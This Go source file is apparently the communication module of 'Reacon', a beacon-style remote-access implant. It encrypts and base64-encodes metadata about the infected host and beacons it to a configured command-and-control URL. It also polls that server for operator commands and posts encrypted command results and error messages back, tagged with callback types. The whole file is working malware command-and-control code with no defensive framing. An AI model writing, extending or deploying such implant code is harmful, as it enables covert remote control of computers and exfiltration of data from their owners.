package communication

import (
	"Reacon/pkg/config"
	"Reacon/pkg/encrypt"
	"Reacon/pkg/utils"
	"bytes"
	"encoding/binary"
	"fmt"
	"sync"
	"time"
)

var (
	encryptedMetaInfo []byte
)

func FirstBlood() error {
	var err error
	encryptedMetaInfo, err = utils.EncryptedMetaInfo()
	if err != nil {
		return err
	}
	encryptedMetaInfo, err = encrypt.EncodeBase64(encryptedMetaInfo)
	if err != nil {
		return err
	}
	for {
		_, err := HttpGet(config.GetUrl, encryptedMetaInfo)
		if err == nil {
			//fmt.Println("firstblood: " + string(data))
			break
		} else {
			fmt.Println("firstblood error: " + err.Error())
		}
		time.Sleep(500 * time.Millisecond)
	}
	time.Sleep(3000 * time.Millisecond)
	return err
}

func PullCommand() ([]byte, error) {
	data, err := HttpGet(config.GetUrl, encryptedMetaInfo)
	if err != nil {
		return nil, err
	}
	return data, err
}
func ErrorProcess(err error) {
	errMsgBytes := []byte(err.Error())
	result := errMsgBytes
	fmt.Println(err)
	criticalSection(31, result)
}

func DataProcess(callbackType int, b []byte) {
	result := b
	var err error
	if callbackType == 0 {
		result, err = utils.CodepageToUTF8(b)
		if err != nil {
			ErrorProcess(err)
		}
	}
	_, err = criticalSection(callbackType, result)
	if err != nil {
		ErrorProcess(err)
	}
}

var mutex sync.Mutex

func criticalSection(callbackType int, b []byte) ([]byte, error) {
	mutex.Lock()
	finalPaket := MakePacket(callbackType, b)
	result, err := PushResult(finalPaket)
	mutex.Unlock()
	return result, err
}

// replyType(4) | result  并加密
func MakePacket(replyType int, b []byte) []byte {
	buf := new(bytes.Buffer)

	replyTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(replyTypeBytes, uint32(replyType))
	buf.Write(replyTypeBytes)

	buf.Write(b)

	encrypted, err := encrypt.Encrypt(buf.Bytes())
	if err != nil {
		return nil
	}

	buf.Reset()

	buf.Write(encrypted)

	return buf.Bytes()

}
func PushResult(b []byte) ([]byte, error) {
	url := config.PostUrl
	data, err := HttpPost(url, b, encryptedMetaInfo)
	//fmt.Println("pushresult success")
	if err != nil {
		return nil, err
	}
	return data, err
}
